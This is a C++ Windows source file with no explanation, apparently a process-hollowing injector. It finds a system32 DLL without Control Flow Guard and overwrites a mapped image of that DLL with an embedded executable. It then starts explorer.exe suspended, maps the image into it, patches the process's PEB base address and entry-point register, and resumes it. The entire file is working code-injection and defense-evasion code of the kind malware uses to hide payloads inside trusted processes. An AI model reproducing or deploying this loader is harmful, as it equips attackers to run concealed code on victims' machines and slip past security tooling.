#include "stdafx.h"

_NT_BEGIN

BOOLEAN IsImageOk(_In_ ULONG SizeOfImage, _In_ HANDLE hSection)
{
	BOOLEAN fOk = FALSE;

	SIZE_T ViewSize = 0;
	union {
		PVOID BaseAddress = 0;
		PIMAGE_DOS_HEADER pidh;
	};

	if (0 <= ZwMapViewOfSection(hSection, NtCurrentProcess(), &BaseAddress, 0, 0, 0, 
		&ViewSize, ViewUnmap, 0, PAGE_READONLY))
	{
		if (ViewSize >= SizeOfImage && pidh->e_magic == IMAGE_DOS_SIGNATURE)
		{
			ULONG VirtualAddress = pidh->e_lfanew;

			if (VirtualAddress < ViewSize - sizeof(IMAGE_NT_HEADERS))
			{
				union {
					PVOID pv;
					PIMAGE_NT_HEADERS pinth;
					PIMAGE_LOAD_CONFIG_DIRECTORY picd;
				};

				pv = RtlOffsetToPointer(BaseAddress, VirtualAddress);

				if (pinth->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR_MAGIC && 
					pinth->OptionalHeader.SizeOfImage >= SizeOfImage)
				{
					IMAGE_DATA_DIRECTORY DataDirectory = pinth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG];

					if (DataDirectory.Size < __builtin_offsetof(IMAGE_LOAD_CONFIG_DIRECTORY, GuardFlags))
					{
						fOk = TRUE;
					}
					else
					{
						if (DataDirectory.VirtualAddress < ViewSize - sizeof(IMAGE_LOAD_CONFIG_DIRECTORY))
						{
							pv = RtlOffsetToPointer(BaseAddress, DataDirectory.VirtualAddress);

							fOk = picd->Size < __builtin_offsetof(IMAGE_LOAD_CONFIG_DIRECTORY, GuardFlags) || 
								!picd->GuardCFFunctionCount;
						}
					}
				}
			}
		}

		ZwUnmapViewOfSection(NtCurrentProcess(), BaseAddress);
	}

	return fOk;
}

NTSTATUS FindNoCfgDll(_In_ ULONG SizeOfImage, _Out_ PHANDLE SectionHandle)
{
	HANDLE hFile;
	IO_STATUS_BLOCK iosb;
	UNICODE_STRING ObjectName;
	OBJECT_ATTRIBUTES oa = { sizeof(oa), 0, &ObjectName, OBJ_CASE_INSENSITIVE };
	RtlInitUnicodeString(&ObjectName, L"\\systemroot\\system32");

	NTSTATUS status = NtOpenFile(&oa.RootDirectory, 
		FILE_LIST_DIRECTORY|SYNCHRONIZE, &oa, &iosb, FILE_SHARE_VALID_FLAGS, 
		FILE_DIRECTORY_FILE|FILE_SYNCHRONOUS_IO_NONALERT);
	
	if (0 <= status)
	{
		status = STATUS_NO_MEMORY;

		enum { buf_size = 0x10000 };
		
		if (PVOID buf = LocalAlloc(0, buf_size))
		{
			static const UNICODE_STRING DLL = RTL_CONSTANT_STRING(L"*.dll");

			while (0 <= (status = NtQueryDirectoryFile(oa.RootDirectory, 
				0, 0, 0, &iosb, buf, buf_size, FileDirectoryInformation,
				FALSE, const_cast<PUNICODE_STRING>(&DLL), FALSE)))
			{
				union {
					PVOID pv;
					PUCHAR pc;
					PFILE_DIRECTORY_INFORMATION pfdi;
				};

				pv = buf;

				ULONG NextEntryOffset = 0;

				do 
				{
					pc += NextEntryOffset;

					if (pfdi->EndOfFile.QuadPart >= SizeOfImage)
					{
						ObjectName.Buffer = pfdi->FileName;
						ObjectName.MaximumLength = ObjectName.Length = (USHORT)pfdi->FileNameLength;

						if (0 <= NtOpenFile(&hFile, FILE_READ_DATA|SYNCHRONIZE, &oa, &iosb, FILE_SHARE_READ, 
							FILE_NON_DIRECTORY_FILE|FILE_SYNCHRONOUS_IO_NONALERT))
						{
							BOOLEAN fOk = FALSE;

							HANDLE hSection;

							if (0 <= NtCreateSection(&hSection, SECTION_MAP_READ, 0, 0, PAGE_READONLY, SEC_IMAGE_NO_EXECUTE, hFile))
							{
								fOk = IsImageOk(SizeOfImage, hSection);
								
								NtClose(hSection);

								if (fOk)
								{
									fOk = 0 <= NtCreateSection(SectionHandle, 
										SECTION_MAP_EXECUTE|SECTION_MAP_READ|SECTION_MAP_WRITE, 
										0, 0, PAGE_WRITECOPY, SEC_IMAGE, hFile);
								}
							}

							NtClose(hFile);

							if (0 <= status)
							{
								if (fOk)
								{
									//DbgPrint("%I64x %wZ\n", pfdi->EndOfFile.QuadPart, &ObjectName);

									goto __exit;
								}
							}
						}
					}

				} while (NextEntryOffset = pfdi->NextEntryOffset);
			}
__exit:
			LocalFree(buf);
		}
		NtClose(oa.RootDirectory);
	}

	return status;
}

EXTERN_C extern UCHAR codesec_exe_begin[], codesec_exe_end[];

void CopyImage(PVOID BaseAddress, PVOID BaseOfImage, PIMAGE_NT_HEADERS pinth)
{
	memcpy(BaseAddress, BaseOfImage, pinth->OptionalHeader.SizeOfHeaders);

	if (ULONG NumberOfSections = pinth->FileHeader.NumberOfSections)
	{
		PIMAGE_SECTION_HEADER pish = IMAGE_FIRST_SECTION(pinth);

		do 
		{
			if (ULONG cb = min(pish->Misc.VirtualSize, pish->SizeOfRawData))
			{
				memcpy((PBYTE)BaseAddress + pish->VirtualAddress, (PBYTE)BaseOfImage + pish->PointerToRawData, cb);
			}
		} while (pish++, --NumberOfSections);
	}
}

void Relocate(PVOID BaseAddress, LONG_PTR RemoteBase)
{
	ULONG size;

	union {
		PVOID pv;
		PBYTE pb;
		PIMAGE_BASE_RELOCATION pibr;
	};

	PULONG_PTR pImageBase = &RtlImageNtHeader(BaseAddress)->OptionalHeader.ImageBase;
	LONG_PTR Delta = RemoteBase - *pImageBase;
	*pImageBase = RemoteBase;

	if (pv = RtlImageDirectoryEntryToData(BaseAddress, TRUE, IMAGE_DIRECTORY_ENTRY_BASERELOC, &size))
	{
		ULONG SizeOfBlock;
		do 
		{
			SizeOfBlock = pibr->SizeOfBlock;

			pibr = LdrProcessRelocationBlock((PBYTE)BaseAddress + pibr->VirtualAddress, 
				(SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) >> 1, (PUSHORT)(pibr + 1), Delta);

		} while (size -= SizeOfBlock);
	}
}

NTSTATUS ProtectImage(HANDLE hProcess, PVOID RemoteBase, PIMAGE_NT_HEADERS pinth)
{
	if (ULONG NumberOfSections = pinth->FileHeader.NumberOfSections)
	{
		PIMAGE_SECTION_HEADER pish = IMAGE_FIRST_SECTION(pinth);

		do 
		{
			if (ULONG VirtualSize = pish->Misc.VirtualSize)
			{
				ULONG NewProtect = PAGE_NOACCESS;

				switch (pish->Characteristics & (IMAGE_SCN_MEM_EXECUTE|IMAGE_SCN_MEM_WRITE|IMAGE_SCN_MEM_READ))
				{
				case IMAGE_SCN_MEM_READ:
					NewProtect = PAGE_READONLY;
					break;

				case IMAGE_SCN_MEM_EXECUTE:
					NewProtect = PAGE_EXECUTE;
					break;

				case IMAGE_SCN_MEM_EXECUTE|IMAGE_SCN_MEM_READ:
					NewProtect = PAGE_EXECUTE_READ;
					break;

				case IMAGE_SCN_MEM_WRITE:
				case IMAGE_SCN_MEM_WRITE|IMAGE_SCN_MEM_READ:
					NewProtect = PAGE_READWRITE;
					break;

				case IMAGE_SCN_MEM_EXECUTE|IMAGE_SCN_MEM_WRITE:
				case IMAGE_SCN_MEM_EXECUTE|IMAGE_SCN_MEM_WRITE|IMAGE_SCN_MEM_READ:
					NewProtect = PAGE_EXECUTE_READWRITE;
					break;
				}

				if (!VirtualProtectEx(hProcess, (PBYTE)RemoteBase + pish->VirtualAddress, VirtualSize, NewProtect, &VirtualSize))
				{
					return RtlGetLastNtStatus();
				}
			}
		} while (pish++, --NumberOfSections);
	}

	return TRUE;
}

#ifdef _AMD64_
	#define EP_REG Rcx
#elif defined(_X86_)
	#define EP_REG Eax
#else
	#error target architecture not supported
#endif

void Inject(PVOID BaseOfImage)
{
	if (PIMAGE_NT_HEADERS pinth = RtlImageNtHeader(BaseOfImage))
	{
		HANDLE hSection;

		ULONG SizeOfImage = pinth->OptionalHeader.SizeOfImage;

		if (0 <= FindNoCfgDll(SizeOfImage, &hSection))
		{
			SIZE_T ViewSize = 0;
			PVOID BaseAddress = 0;

			if (0 <= ZwMapViewOfSection(hSection, NtCurrentProcess(), &BaseAddress, 0, 0, 0, 
				&ViewSize, ViewUnmap, 0, PAGE_NOACCESS))
			{
				ULONG op;
				if (VirtualProtect(BaseAddress, SizeOfImage, PAGE_READWRITE, &op))
				{
					RtlZeroMemory(BaseAddress, SizeOfImage);

					CopyImage(BaseAddress, BaseOfImage, pinth);

					STARTUPINFO si = { sizeof(si) };
					PROCESS_INFORMATION pi;
					WCHAR explorer[] = L"explorer.exe";

					if (CreateProcessW(0, explorer, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi))
					{
						::CONTEXT ctx {};
						ctx.ContextFlags = CONTEXT_INTEGER;

						PROCESS_BASIC_INFORMATION pbi;
						PVOID ImageBaseAddress;

						PVOID RemoteBase = 0;
						ViewSize = SizeOfImage;
						BOOL fOk = FALSE;

						if (0 <= NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), 0) &&
							GetThreadContext(pi.hThread, &ctx) &&
							ReadProcessMemory(pi.hProcess, 
							&reinterpret_cast<_PEB*>(pbi.PebBaseAddress)->ImageBaseAddress, 
							&ImageBaseAddress, sizeof(ImageBaseAddress), 0) &&
							0 <= ZwMapViewOfSection(hSection, pi.hProcess, &RemoteBase, 0, 0, 0, &ViewSize, ViewShare, 0, PAGE_READONLY))
						{
							Relocate(BaseAddress, (LONG_PTR)RemoteBase);

							ctx.EP_REG = (ULONG_PTR)RemoteBase + pinth->OptionalHeader.AddressOfEntryPoint;

							fOk = VirtualProtectEx(pi.hProcess, RemoteBase, SizeOfImage, PAGE_READWRITE, &op) &&
								WriteProcessMemory(pi.hProcess, RemoteBase, BaseAddress, SizeOfImage, 0) &&
								0 <= ProtectImage(pi.hProcess, RemoteBase, pinth) &&
								WriteProcessMemory(pi.hProcess, 
								&reinterpret_cast<_PEB*>(pbi.PebBaseAddress)->ImageBaseAddress,
								&RemoteBase, sizeof(RemoteBase), 0) &&
								SetThreadContext(pi.hThread, &ctx) &&
								ResumeThread(pi.hThread);

						}

						if (!fOk)
						{
							TerminateProcess(pi.hProcess, 0);
						}

						NtClose(pi.hThread);
						NtClose(pi.hProcess);
					}
				}
			}

			ZwUnmapViewOfSection(NtCurrentProcess(), BaseAddress);
			NtClose(hSection);
		}
	}
}

void WINAPI ep(void*)
{
	Inject(codesec_exe_begin);
	ExitProcess(0);
}

_NT_END
